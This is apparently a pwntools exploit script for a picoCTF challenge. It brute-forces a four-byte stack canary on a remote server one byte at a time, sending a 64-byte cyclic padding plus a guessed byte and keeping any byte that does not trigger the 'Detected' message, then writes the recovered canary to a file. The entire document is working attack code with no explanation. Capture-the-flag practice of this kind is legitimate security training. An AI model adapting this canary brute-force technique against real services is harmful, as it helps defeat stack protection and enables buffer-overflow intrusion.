import pwn

HOST = "saturn.picoctf.net"
PORT = 61615

canary = b""

for i in range(4):
    for b in range(256):
        p = pwn.remote(HOST, PORT)
        guess = canary + pwn.p8(b)

        payload = pwn.cyclic(64) + guess
        p.sendlineafter(b"> ", str(len(payload)).encode())
        p.sendlineafter(b"> ", payload)

        out = p.recvall(timeout=1)
        if b"Detected" not in out:
            canary += pwn.p8(b)
            pwn.log.success(f"founded byte {i}: {hex(b)}")
            p.close()
            break

        p.close()

with open("canary.txt", "wb") as f:
    f.write(canary)
